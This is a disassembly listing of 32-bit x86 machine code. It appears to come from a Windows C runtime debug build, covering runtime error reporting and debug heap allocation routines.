  405c18:	c3                   	ret
  405c19:	cc                   	int3
  405c1a:	cc                   	int3
  405c1b:	cc                   	int3
  405c1c:	cc                   	int3
  405c1d:	cc                   	int3
  405c1e:	cc                   	int3
  405c1f:	cc                   	int3
  405c20:	55                   	push   %ebp
  405c21:	8b ec                	mov    %esp,%ebp
  405c23:	81 ec b0 01 00 00    	sub    $0x1b0,%esp
  405c29:	53                   	push   %ebx
  405c2a:	56                   	push   %esi
  405c2b:	57                   	push   %edi
  405c2c:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  405c33:	eb 09                	jmp    0x405c3e
  405c35:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405c38:	83 c0 01             	add    $0x1,%eax
  405c3b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405c3e:	83 7d f8 12          	cmpl   $0x12,-0x8(%ebp)
  405c42:	73 13                	jae    0x405c57
  405c44:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405c47:	8b 55 08             	mov    0x8(%ebp),%edx
  405c4a:	3b 14 cd f8 b0 45 00 	cmp    0x45b0f8(,%ecx,8),%edx
  405c51:	75 02                	jne    0x405c55
  405c53:	eb 02                	jmp    0x405c57
  405c55:	eb de                	jmp    0x405c35
  405c57:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405c5a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405c5d:	3b 0c c5 f8 b0 45 00 	cmp    0x45b0f8(,%eax,8),%ecx
  405c64:	0f 85 6e 01 00 00    	jne    0x405dd8
  405c6a:	81 7d 08 fc 00 00 00 	cmpl   $0xfc,0x8(%ebp)
  405c71:	74 21                	je     0x405c94
  405c73:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405c76:	8b 04 d5 fc b0 45 00 	mov    0x45b0fc(,%edx,8),%eax
  405c7d:	50                   	push   %eax
  405c7e:	6a 00                	push   $0x0
  405c80:	6a 00                	push   $0x0
  405c82:	6a 00                	push   $0x0
  405c84:	6a 01                	push   $0x1
  405c86:	e8 35 39 00 00       	call   0x4095c0
  405c8b:	83 c4 14             	add    $0x14,%esp
  405c8e:	83 f8 01             	cmp    $0x1,%eax
  405c91:	75 01                	jne    0x405c94
  405c93:	cc                   	int3
  405c94:	83 3d 70 dc 45 00 01 	cmpl   $0x1,0x45dc70
  405c9b:	74 12                	je     0x405caf
  405c9d:	83 3d 70 dc 45 00 00 	cmpl   $0x0,0x45dc70
  405ca4:	75 42                	jne    0x405ce8
  405ca6:	83 3d 64 af 45 00 01 	cmpl   $0x1,0x45af64
  405cad:	75 39                	jne    0x405ce8
  405caf:	6a 00                	push   $0x0
  405cb1:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405cb4:	51                   	push   %ecx
  405cb5:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405cb8:	8b 04 d5 fc b0 45 00 	mov    0x45b0fc(,%edx,8),%eax
  405cbf:	50                   	push   %eax
  405cc0:	e8 fb 4c 00 00       	call   0x40a9c0
  405cc5:	83 c4 04             	add    $0x4,%esp
  405cc8:	50                   	push   %eax
  405cc9:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405ccc:	8b 14 cd fc b0 45 00 	mov    0x45b0fc(,%ecx,8),%edx
  405cd3:	52                   	push   %edx
  405cd4:	6a f4                	push   $0xfffffff4
  405cd6:	ff 15 88 f0 40 00    	call   *0x40f088
  405cdc:	50                   	push   %eax
  405cdd:	ff 15 a0 f0 40 00    	call   *0x40f0a0
  405ce3:	e9 f0 00 00 00       	jmp    0x405dd8
  405ce8:	81 7d 08 fc 00 00 00 	cmpl   $0xfc,0x8(%ebp)
  405cef:	0f 84 e3 00 00 00    	je     0x405dd8
  405cf5:	68 04 01 00 00       	push   $0x104
  405cfa:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  405d00:	50                   	push   %eax
  405d01:	6a 00                	push   $0x0
  405d03:	ff 15 6c f0 40 00    	call   *0x40f06c
  405d09:	85 c0                	test   %eax,%eax
  405d0b:	75 14                	jne    0x405d21
  405d0d:	68 44 f5 40 00       	push   $0x40f544
  405d12:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  405d18:	51                   	push   %ecx
  405d19:	e8 b2 4b 00 00       	call   0x40a8d0
  405d1e:	83 c4 08             	add    $0x8,%esp
  405d21:	8d 95 f0 fe ff ff    	lea    -0x110(%ebp),%edx
  405d27:	89 55 f4             	mov    %edx,-0xc(%ebp)
  405d2a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405d2d:	50                   	push   %eax
  405d2e:	e8 8d 4c 00 00       	call   0x40a9c0
  405d33:	83 c4 04             	add    $0x4,%esp
  405d36:	83 c0 01             	add    $0x1,%eax
  405d39:	83 f8 3c             	cmp    $0x3c,%eax
  405d3c:	76 2c                	jbe    0x405d6a
  405d3e:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  405d44:	51                   	push   %ecx
  405d45:	e8 76 4c 00 00       	call   0x40a9c0
  405d4a:	83 c4 04             	add    $0x4,%esp
  405d4d:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405d50:	8d 44 02 c5          	lea    -0x3b(%edx,%eax,1),%eax
  405d54:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405d57:	6a 03                	push   $0x3
  405d59:	68 40 f5 40 00       	push   $0x40f540
  405d5e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405d61:	51                   	push   %ecx
  405d62:	e8 b9 52 00 00       	call   0x40b020
  405d67:	83 c4 0c             	add    $0xc,%esp
  405d6a:	68 24 f5 40 00       	push   $0x40f524
  405d6f:	8d 95 50 fe ff ff    	lea    -0x1b0(%ebp),%edx
  405d75:	52                   	push   %edx
  405d76:	e8 55 4b 00 00       	call   0x40a8d0
  405d7b:	83 c4 08             	add    $0x8,%esp
  405d7e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405d81:	50                   	push   %eax
  405d82:	8d 8d 50 fe ff ff    	lea    -0x1b0(%ebp),%ecx
  405d88:	51                   	push   %ecx
  405d89:	e8 52 4b 00 00       	call   0x40a8e0
  405d8e:	83 c4 08             	add    $0x8,%esp
  405d91:	68 20 f5 40 00       	push   $0x40f520
  405d96:	8d 95 50 fe ff ff    	lea    -0x1b0(%ebp),%edx
  405d9c:	52                   	push   %edx
  405d9d:	e8 3e 4b 00 00       	call   0x40a8e0
  405da2:	83 c4 08             	add    $0x8,%esp
  405da5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405da8:	8b 0c c5 fc b0 45 00 	mov    0x45b0fc(,%eax,8),%ecx
  405daf:	51                   	push   %ecx
  405db0:	8d 95 50 fe ff ff    	lea    -0x1b0(%ebp),%edx
  405db6:	52                   	push   %edx
  405db7:	e8 24 4b 00 00       	call   0x40a8e0
  405dbc:	83 c4 08             	add    $0x8,%esp
  405dbf:	68 10 20 01 00       	push   $0x12010
  405dc4:	68 f8 f4 40 00       	push   $0x40f4f8
  405dc9:	8d 85 50 fe ff ff    	lea    -0x1b0(%ebp),%eax
  405dcf:	50                   	push   %eax
  405dd0:	e8 8b 51 00 00       	call   0x40af60
  405dd5:	83 c4 0c             	add    $0xc,%esp
  405dd8:	5f                   	pop    %edi
  405dd9:	5e                   	pop    %esi
  405dda:	5b                   	pop    %ebx
  405ddb:	8b e5                	mov    %ebp,%esp
  405ddd:	5d                   	pop    %ebp
  405dde:	c3                   	ret
  405ddf:	cc                   	int3
  405de0:	55                   	push   %ebp
  405de1:	8b ec                	mov    %esp,%ebp
  405de3:	51                   	push   %ecx
  405de4:	8b 45 14             	mov    0x14(%ebp),%eax
  405de7:	50                   	push   %eax
  405de8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  405deb:	51                   	push   %ecx
  405dec:	8b 55 0c             	mov    0xc(%ebp),%edx
  405def:	52                   	push   %edx
  405df0:	a1 5c de 45 00       	mov    0x45de5c,%eax
  405df5:	50                   	push   %eax
  405df6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405df9:	51                   	push   %ecx
  405dfa:	e8 11 00 00 00       	call   0x405e10
  405dff:	83 c4 14             	add    $0x14,%esp
  405e02:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405e05:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405e08:	8b e5                	mov    %ebp,%esp
  405e0a:	5d                   	pop    %ebp
  405e0b:	c3                   	ret
  405e0c:	cc                   	int3
  405e0d:	cc                   	int3
  405e0e:	cc                   	int3
  405e0f:	cc                   	int3
  405e10:	55                   	push   %ebp
  405e11:	8b ec                	mov    %esp,%ebp
  405e13:	6a ff                	push   $0xffffffff
  405e15:	68 80 f5 40 00       	push   $0x40f580
  405e1a:	68 f8 5a 40 00       	push   $0x405af8
  405e1f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405e25:	50                   	push   %eax
  405e26:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405e2d:	83 c4 f4             	add    $0xfffffff4,%esp
  405e30:	53                   	push   %ebx
  405e31:	56                   	push   %esi
  405e32:	57                   	push   %edi
  405e33:	6a 09                	push   $0x9
  405e35:	e8 36 d6 ff ff       	call   0x403470
  405e3a:	83 c4 04             	add    $0x4,%esp
  405e3d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  405e44:	8b 45 18             	mov    0x18(%ebp),%eax
  405e47:	50                   	push   %eax
  405e48:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405e4b:	51                   	push   %ecx
  405e4c:	8b 55 10             	mov    0x10(%ebp),%edx
  405e4f:	52                   	push   %edx
  405e50:	8b 45 08             	mov    0x8(%ebp),%eax
  405e53:	50                   	push   %eax
  405e54:	e8 57 00 00 00       	call   0x405eb0
  405e59:	83 c4 10             	add    $0x10,%esp
  405e5c:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405e5f:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  405e66:	e8 02 00 00 00       	call   0x405e6d
  405e6b:	eb 0b                	jmp    0x405e78
  405e6d:	6a 09                	push   $0x9
  405e6f:	e8 9c d6 ff ff       	call   0x403510
  405e74:	83 c4 04             	add    $0x4,%esp
  405e77:	c3                   	ret
  405e78:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  405e7c:	75 06                	jne    0x405e84
  405e7e:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  405e82:	75 05                	jne    0x405e89
  405e84:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405e87:	eb 16                	jmp    0x405e9f
  405e89:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405e8c:	51                   	push   %ecx
  405e8d:	e8 8e 52 00 00       	call   0x40b120
  405e92:	83 c4 04             	add    $0x4,%esp
  405e95:	85 c0                	test   %eax,%eax
  405e97:	75 04                	jne    0x405e9d
  405e99:	33 c0                	xor    %eax,%eax
  405e9b:	eb 02                	jmp    0x405e9f
  405e9d:	eb 94                	jmp    0x405e33
  405e9f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405ea2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405ea9:	5f                   	pop    %edi
  405eaa:	5e                   	pop    %esi
  405eab:	5b                   	pop    %ebx
  405eac:	8b e5                	mov    %ebp,%esp
  405eae:	5d                   	pop    %ebp
  405eaf:	c3                   	ret
  405eb0:	55                   	push   %ebp
  405eb1:	8b ec                	mov    %esp,%ebp
  405eb3:	83 ec 10             	sub    $0x10,%esp
  405eb6:	53                   	push   %ebx
  405eb7:	56                   	push   %esi
  405eb8:	57                   	push   %edi
  405eb9:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  405ec0:	a1 88 b1 45 00       	mov    0x45b188,%eax
  405ec5:	83 e0 04             	and    $0x4,%eax
  405ec8:	85 c0                	test   %eax,%eax
  405eca:	74 30                	je     0x405efc
  405ecc:	e8 4f 08 00 00       	call   0x406720
  405ed1:	85 c0                	test   %eax,%eax
  405ed3:	75 21                	jne    0x405ef6
  405ed5:	68 50 f6 40 00       	push   $0x40f650
  405eda:	6a 00                	push   $0x0
  405edc:	68 4c 01 00 00       	push   $0x14c
  405ee1:	68 44 f6 40 00       	push   $0x40f644
  405ee6:	6a 02                	push   $0x2
  405ee8:	e8 d3 36 00 00       	call   0x4095c0
  405eed:	83 c4 14             	add    $0x14,%esp
  405ef0:	83 f8 01             	cmp    $0x1,%eax
  405ef3:	75 01                	jne    0x405ef6
  405ef5:	cc                   	int3
  405ef6:	33 c9                	xor    %ecx,%ecx
  405ef8:	85 c9                	test   %ecx,%ecx
  405efa:	75 d0                	jne    0x405ecc
  405efc:	8b 15 8c b1 45 00    	mov    0x45b18c,%edx
  405f02:	89 55 f8             	mov    %edx,-0x8(%ebp)
  405f05:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405f08:	3b 05 90 b1 45 00    	cmp    0x45b190,%eax
  405f0e:	75 01                	jne    0x405f11
  405f10:	cc                   	int3
  405f11:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405f14:	51                   	push   %ecx
  405f15:	8b 55 10             	mov    0x10(%ebp),%edx
  405f18:	52                   	push   %edx
  405f19:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405f1c:	50                   	push   %eax
  405f1d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405f20:	51                   	push   %ecx
  405f21:	8b 55 08             	mov    0x8(%ebp),%edx
  405f24:	52                   	push   %edx
  405f25:	6a 00                	push   $0x0
  405f27:	6a 01                	push   $0x1
  405f29:	ff 15 00 d3 45 00    	call   *0x45d300
  405f2f:	83 c4 1c             	add    $0x1c,%esp
  405f32:	85 c0                	test   %eax,%eax
  405f34:	75 5e                	jne    0x405f94
  405f36:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  405f3a:	74 2b                	je     0x405f67
  405f3c:	8b 45 14             	mov    0x14(%ebp),%eax
  405f3f:	50                   	push   %eax
  405f40:	8b 4d 10             	mov    0x10(%ebp),%ecx
  405f43:	51                   	push   %ecx
  405f44:	68 0c f6 40 00       	push   $0x40f60c
  405f49:	6a 00                	push   $0x0
  405f4b:	6a 00                	push   $0x0
  405f4d:	6a 00                	push   $0x0
  405f4f:	6a 00                	push   $0x0
  405f51:	e8 6a 36 00 00       	call   0x4095c0
  405f56:	83 c4 1c             	add    $0x1c,%esp
  405f59:	83 f8 01             	cmp    $0x1,%eax
  405f5c:	75 01                	jne    0x405f5f
  405f5e:	cc                   	int3
  405f5f:	33 d2                	xor    %edx,%edx
  405f61:	85 d2                	test   %edx,%edx
  405f63:	75 d7                	jne    0x405f3c
  405f65:	eb 26                	jmp    0x405f8d
  405f67:	68 e8 f5 40 00       	push   $0x40f5e8
  405f6c:	68 e4 f5 40 00       	push   $0x40f5e4
  405f71:	6a 00                	push   $0x0
  405f73:	6a 00                	push   $0x0
  405f75:	6a 00                	push   $0x0
  405f77:	6a 00                	push   $0x0
  405f79:	e8 42 36 00 00       	call   0x4095c0
  405f7e:	83 c4 18             	add    $0x18,%esp
  405f81:	83 f8 01             	cmp    $0x1,%eax
  405f84:	75 01                	jne    0x405f87
  405f86:	cc                   	int3
  405f87:	33 c0                	xor    %eax,%eax
  405f89:	85 c0                	test   %eax,%eax
  405f8b:	75 da                	jne    0x405f67
  405f8d:	33 c0                	xor    %eax,%eax
  405f8f:	e9 28 02 00 00       	jmp    0x4061bc
  405f94:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405f97:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  405f9d:	83 f9 02             	cmp    $0x2,%ecx
  405fa0:	74 14                	je     0x405fb6
  405fa2:	8b 15 88 b1 45 00    	mov    0x45b188,%edx
  405fa8:	83 e2 01             	and    $0x1,%edx
  405fab:	85 d2                	test   %edx,%edx
  405fad:	75 07                	jne    0x405fb6
  405faf:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  405fb6:	83 7d 08 e0          	cmpl   $0xffffffe0,0x8(%ebp)
  405fba:	77 0b                	ja     0x405fc7
  405fbc:	8b 45 08             	mov    0x8(%ebp),%eax
  405fbf:	83 c0 24             	add    $0x24,%eax
  405fc2:	83 f8 e0             	cmp    $0xffffffe0,%eax
  405fc5:	76 2c                	jbe    0x405ff3
  405fc7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405fca:	51                   	push   %ecx
  405fcb:	68 c0 f5 40 00       	push   $0x40f5c0
  405fd0:	6a 00                	push   $0x0
  405fd2:	6a 00                	push   $0x0
  405fd4:	6a 00                	push   $0x0
  405fd6:	6a 01                	push   $0x1
  405fd8:	e8 e3 35 00 00       	call   0x4095c0
  405fdd:	83 c4 18             	add    $0x18,%esp
  405fe0:	83 f8 01             	cmp    $0x1,%eax
  405fe3:	75 01                	jne    0x405fe6
  405fe5:	cc                   	int3
  405fe6:	33 d2                	xor    %edx,%edx
  405fe8:	85 d2                	test   %edx,%edx
  405fea:	75 db                	jne    0x405fc7
  405fec:	33 c0                	xor    %eax,%eax
  405fee:	e9 c9 01 00 00       	jmp    0x4061bc
  405ff3:	8b 45 0c             	mov    0xc(%ebp),%eax
  405ff6:	25 ff ff 00 00       	and    $0xffff,%eax
  405ffb:	83 f8 04             	cmp    $0x4,%eax
  405ffe:	74 40                	je     0x406040
  406000:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  406004:	74 3a                	je     0x406040
  406006:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406009:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  40600f:	83 f9 02             	cmp    $0x2,%ecx
  406012:	74 2c                	je     0x406040
  406014:	83 7d 0c 03          	cmpl   $0x3,0xc(%ebp)
  406018:	74 26                	je     0x406040
  40601a:	68 8c f5 40 00       	push   $0x40f58c
  40601f:	68 e4 f5 40 00       	push   $0x40f5e4
  406024:	6a 00                	push   $0x0
  406026:	6a 00                	push   $0x0
  406028:	6a 00                	push   $0x0
  40602a:	6a 01                	push   $0x1
  40602c:	e8 8f 35 00 00       	call   0x4095c0
  406031:	83 c4 18             	add    $0x18,%esp
  406034:	83 f8 01             	cmp    $0x1,%eax
  406037:	75 01                	jne    0x40603a
  406039:	cc                   	int3
  40603a:	33 d2                	xor    %edx,%edx
  40603c:	85 d2                	test   %edx,%edx
  40603e:	75 da                	jne    0x40601a
  406040:	8b 45 08             	mov    0x8(%ebp),%eax
  406043:	83 c0 24             	add    $0x24,%eax
  406046:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406049:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40604c:	51                   	push   %ecx
  40604d:	e8 fe 50 00 00       	call   0x40b150
  406052:	83 c4 04             	add    $0x4,%esp
  406055:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406058:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40605c:	75 07                	jne    0x406065
  40605e:	33 c0                	xor    %eax,%eax
  406060:	e9 57 01 00 00       	jmp    0x4061bc
  406065:	8b 15 8c b1 45 00    	mov    0x45b18c,%edx
  40606b:	83 c2 01             	add    $0x1,%edx
  40606e:	89 15 8c b1 45 00    	mov    %edx,0x45b18c
  406074:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  406078:	74 49                	je     0x4060c3
  40607a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40607d:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  406083:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406086:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  40608d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406090:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  406097:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40609a:	c7 40 0c bc ba dc fe 	movl   $0xfedcbabc,0xc(%eax)
  4060a1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4060a4:	8b 55 08             	mov    0x8(%ebp),%edx
  4060a7:	89 51 10             	mov    %edx,0x10(%ecx)
  4060aa:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4060ad:	c7 40 14 03 00 00 00 	movl   $0x3,0x14(%eax)
  4060b4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4060b7:	c7 41 18 00 00 00 00 	movl   $0x0,0x18(%ecx)
  4060be:	e9 a0 00 00 00       	jmp    0x406163
  4060c3:	8b 15 34 de 45 00    	mov    0x45de34,%edx
  4060c9:	03 55 08             	add    0x8(%ebp),%edx
  4060cc:	89 15 34 de 45 00    	mov    %edx,0x45de34
  4060d2:	a1 3c de 45 00       	mov    0x45de3c,%eax
  4060d7:	03 45 08             	add    0x8(%ebp),%eax
  4060da:	a3 3c de 45 00       	mov    %eax,0x45de3c
  4060df:	8b 0d 3c de 45 00    	mov    0x45de3c,%ecx
  4060e5:	3b 0d 40 de 45 00    	cmp    0x45de40,%ecx
  4060eb:	76 0c                	jbe    0x4060f9
  4060ed:	8b 15 3c de 45 00    	mov    0x45de3c,%edx
  4060f3:	89 15 40 de 45 00    	mov    %edx,0x45de40
  4060f9:	83 3d 38 de 45 00 00 	cmpl   $0x0,0x45de38
  406100:	74 0d                	je     0x40610f
  406102:	a1 38 de 45 00       	mov    0x45de38,%eax
  406107:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40610a:	89 48 04             	mov    %ecx,0x4(%eax)
  40610d:	eb 09                	jmp    0x406118
  40610f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406112:	89 15 30 de 45 00    	mov    %edx,0x45de30
  406118:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40611b:	8b 0d 38 de 45 00    	mov    0x45de38,%ecx
  406121:	89 08                	mov    %ecx,(%eax)
  406123:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406126:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  40612d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406130:	8b 4d 10             	mov    0x10(%ebp),%ecx
  406133:	89 48 08             	mov    %ecx,0x8(%eax)
  406136:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406139:	8b 45 14             	mov    0x14(%ebp),%eax
  40613c:	89 42 0c             	mov    %eax,0xc(%edx)
  40613f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406142:	8b 55 08             	mov    0x8(%ebp),%edx
  406145:	89 51 10             	mov    %edx,0x10(%ecx)
  406148:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40614b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40614e:	89 48 14             	mov    %ecx,0x14(%eax)
  406151:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406154:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406157:	89 42 18             	mov    %eax,0x18(%edx)
  40615a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40615d:	89 0d 38 de 45 00    	mov    %ecx,0x45de38
  406163:	6a 04                	push   $0x4
  406165:	33 d2                	xor    %edx,%edx
  406167:	8a 15 94 b1 45 00    	mov    0x45b194,%dl
  40616d:	52                   	push   %edx
  40616e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406171:	83 c0 1c             	add    $0x1c,%eax
  406174:	50                   	push   %eax
  406175:	e8 86 d0 ff ff       	call   0x403200
  40617a:	83 c4 0c             	add    $0xc,%esp
  40617d:	6a 04                	push   $0x4
  40617f:	33 c9                	xor    %ecx,%ecx
  406181:	8a 0d 94 b1 45 00    	mov    0x45b194,%cl
  406187:	51                   	push   %ecx
  406188:	8b 55 08             	mov    0x8(%ebp),%edx
  40618b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40618e:	8d 4c 10 20          	lea    0x20(%eax,%edx,1),%ecx
  406192:	51                   	push   %ecx
  406193:	e8 68 d0 ff ff       	call   0x403200
  406198:	83 c4 0c             	add    $0xc,%esp
  40619b:	8b 55 08             	mov    0x8(%ebp),%edx
  40619e:	52                   	push   %edx
  40619f:	33 c0                	xor    %eax,%eax
  4061a1:	a0 96 b1 45 00       	mov    0x45b196,%al
  4061a6:	50                   	push   %eax
  4061a7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4061aa:	83 c1 20             	add    $0x20,%ecx
  4061ad:	51                   	push   %ecx
  4061ae:	e8 4d d0 ff ff       	call   0x403200
  4061b3:	83 c4 0c             	add    $0xc,%esp
  4061b6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4061b9:	83 c0 20             	add    $0x20,%eax
  4061bc:	5f                   	pop    %edi
  4061bd:	5e                   	pop    %esi
  4061be:	5b                   	pop    %ebx
  4061bf:	8b e5                	mov    %ebp,%esp
  4061c1:	5d                   	pop    %ebp
  4061c2:	c3                   	ret
  4061c3:	cc                   	int3
  4061c4:	cc                   	int3
  4061c5:	cc                   	int3
  4061c6:	cc                   	int3
  4061c7:	cc                   	int3
  4061c8:	cc                   	int3
  4061c9:	cc                   	int3
  4061ca:	cc                   	int3
  4061cb:	cc                   	int3
  4061cc:	cc                   	int3
  4061cd:	cc                   	int3
  4061ce:	cc                   	int3
  4061cf:	cc                   	int3
  4061d0:	55                   	push   %ebp
  4061d1:	8b ec                	mov    %esp,%ebp
  4061d3:	83 ec 0c             	sub    $0xc,%esp
  4061d6:	8b 45 0c             	mov    0xc(%ebp),%eax
  4061d9:	0f af 45 08          	imul   0x8(%ebp),%eax
  4061dd:	89 45 0c             	mov    %eax,0xc(%ebp)
  4061e0:	8b 4d 18             	mov    0x18(%ebp),%ecx
  4061e3:	51                   	push   %ecx
  4061e4:	8b 55 14             	mov    0x14(%ebp),%edx
  4061e7:	52                   	push   %edx
  4061e8:	8b 45 10             	mov    0x10(%ebp),%eax
  4061eb:	50                   	push   %eax
  4061ec:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4061ef:	51                   	push   %ecx
  4061f0:	e8 eb fb ff ff       	call   0x405de0
  4061f5:	83 c4 10             	add    $0x10,%esp
  4061f8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4061fb:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4061ff:	74 28                	je     0x406229
  406201:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406204:	89 55 f4             	mov    %edx,-0xc(%ebp)
  406207:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40620a:	03 45 0c             	add    0xc(%ebp),%eax
  40620d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406210:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406213:	3b 4d fc             	cmp    -0x4(%ebp),%ecx
  406216:	73 11                	jae    0x406229
  406218:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40621b:	c6 02 00             	movb   $0x0,(%edx)
  40621e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406221:	83 c0 01             	add    $0x1,%eax
  406224:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406227:	eb e7                	jmp    0x406210
  406229:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40622c:	8b e5                	mov    %ebp,%esp
  40622e:	5d                   	pop    %ebp
  40622f:	c3                   	ret
  406230:	55                   	push   %ebp
  406231:	8b ec                	mov    %esp,%ebp
  406233:	6a ff                	push   $0xffffffff
  406235:	68 88 f6 40 00       	push   $0x40f688
  40623a:	68 f8 5a 40 00       	push   $0x405af8
  40623f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406245:	50                   	push   %eax
  406246:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40624d:	83 ec 08             	sub    $0x8,%esp
  406250:	53                   	push   %ebx
  406251:	56                   	push   %esi
  406252:	57                   	push   %edi
  406253:	6a 09                	push   $0x9
  406255:	e8 16 d2 ff ff       	call   0x403470
  40625a:	83 c4 04             	add    $0x4,%esp
  40625d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  406264:	8b 45 0c             	mov    0xc(%ebp),%eax
  406267:	50                   	push   %eax
  406268:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40626b:	51                   	push   %ecx
  40626c:	e8 2f 00 00 00       	call   0x4062a0
  406271:	83 c4 08             	add    $0x8,%esp
  406274:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40627b:	e8 02 00 00 00       	call   0x406282
  406280:	eb 0b                	jmp    0x40628d
  406282:	6a 09                	push   $0x9
  406284:	e8 87 d2 ff ff       	call   0x403510
  406289:	83 c4 04             	add    $0x4,%esp
  40628c:	c3                   	ret
  40628d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406290:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406297:	5f                   	pop    %edi
  406298:	5e                   	pop    %esi
  406299:	5b                   	pop    %ebx
  40629a:	8b e5                	mov    %ebp,%esp
  40629c:	5d                   	pop    %ebp
  40629d:	c3                   	ret
  40629e:	cc                   	int3
  40629f:	cc                   	int3
  4062a0:	55                   	push   %ebp
  4062a1:	8b ec                	mov    %esp,%ebp
  4062a3:	51                   	push   %ecx
  4062a4:	53                   	push   %ebx
  4062a5:	56                   	push   %esi
  4062a6:	57                   	push   %edi
  4062a7:	a1 88 b1 45 00       	mov    0x45b188,%eax
  4062ac:	83 e0 04             	and    $0x4,%eax
  4062af:	85 c0                	test   %eax,%eax
  4062b1:	74 30                	je     0x4062e3
  4062b3:	e8 68 04 00 00       	call   0x406720
  4062b8:	85 c0                	test   %eax,%eax
  4062ba:	75 21                	jne    0x4062dd
  4062bc:	68 50 f6 40 00       	push   $0x40f650
  4062c1:	6a 00                	push   $0x0
  4062c3:	68 02 04 00 00       	push   $0x402
  4062c8:	68 44 f6 40 00       	push   $0x40f644
  4062cd:	6a 02                	push   $0x2
  4062cf:	e8 ec 32 00 00       	call   0x4095c0
